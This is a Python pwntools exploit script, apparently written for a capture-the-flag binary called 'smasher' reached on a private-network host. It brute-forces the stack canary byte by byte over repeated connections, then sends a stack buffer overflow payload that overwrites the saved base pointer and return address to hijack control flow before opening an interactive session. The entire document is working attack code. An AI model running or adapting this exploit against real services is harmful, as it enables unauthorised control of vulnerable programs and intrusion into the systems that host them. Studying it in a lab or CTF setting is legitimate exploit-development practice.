

from pwn import *

# --- Configuration ---
BINARY_PATH = './smasher'
REMOTE_HOST = '10.1.2.228'
REMOTE_PORT = 1339

context.binary = ELF(BINARY_PATH, checksec=False)
context.log_level = 'info' # Set to 'debug' for more verbose output

# --- Function to find the canary ---
def find_canary():
    """
    Brute-forces the stack canary byte by byte.
    The first byte of the canary is always a null byte (\x00).
    """
    known_canary = b'\x00'
    log.info("Starting canary brute-force...")

    # The canary is 8 bytes on x86-64, and we already know the first byte.
    for i in range(7):
        log.info(f"Finding byte {i+2}/8...")
        for byte_guess in range(256):
            # Start a new process for each guess
            p = remote(REMOTE_HOST, REMOTE_PORT, level='error')

            # We don't care about the first prompt/input
            p.recvuntil(b'Masukkan pesan: ')
            p.sendline(b'junk')
            p.recvuntil(b'LOG: junk\n')

            # Craft the payload: 136 bytes to fill the buffer + known canary + our guess
            payload = b'A' * 136
            payload += known_canary
            payload += bytes([byte_guess])

            p.recvuntil(b'Masukkan data: ')
            p.sendline(payload)

            # If the program doesn't crash with "stack smashing", our guess is correct.
            # We check if we get any output back. A crash usually closes the connection immediately.
            try:
                output = p.recvline()
                if b'Selamat datang' in output: # Check for the welcome message from the next loop
                    log.success(f"Found byte {i+2}: {hex(byte_guess)}")
                    known_canary += bytes([byte_guess])
                    p.close()
                    break
            except EOFError:
                # This means the connection was closed, likely due to a crash.
                p.close()
                continue
            
            # If we reach here, something unexpected happened, but we'll continue guessing.
            p.close()
        
        if len(known_canary) != i + 2:
             log.error("Failed to find a canary byte. Exiting.")
             return None

    log.success(f"Canary found: {hex(u64(known_canary))}")
    return known_canary


# --- Main exploit logic ---
canary = find_canary()

if canary:
    log.info("Proceeding to hijack control flow...")
    p = remote(REMOTE_HOST, REMOTE_PORT)

    # --- Stage 1: Standard first interaction ---
    p.recvuntil(b'Masukkan pesan: ')
    p.sendline(b'final attack')
    p.recvuntil(b'LOG: final attack\n')

    # --- Stage 2: Craft the final payload ---
    # We will overwrite the return address to jump back to the start of handle_input.
    handle_input_address = context.binary.symbols['handle_input']
    log.info(f"handle_input() is at: {hex(handle_input_address)}")

    payload = b'A' * 136           # Fill the buffer
    payload += canary              # The correct canary we just found
    payload += b'B' * 8             # Overwrite the saved RBP (8 bytes)
    payload += p64(handle_input_address) # Overwrite the return address

    log.info("Sending final payload to control RIP...")
    p.recvuntil(b'Masukkan data: ')
    p.sendline(payload)

    # --- Observe the result ---
    # If successful, the program will loop and we'll see the welcome prompt again.
    log.success("Payload sent! Checking for loop...")
    
    try:
        response = p.recvuntil(b'Masukkan pesan: ', timeout=2)
        if b'Masukkan pesan: ' in response:
            log.success("SUCCESS! We have control of the instruction pointer and created a loop.")
            p.interactive() # Give you control over the shell
        else:
            log.failure("Exploit failed. Did not see the prompt again.")
    except EOFError:
        log.failure("Exploit failed. The connection was closed.")

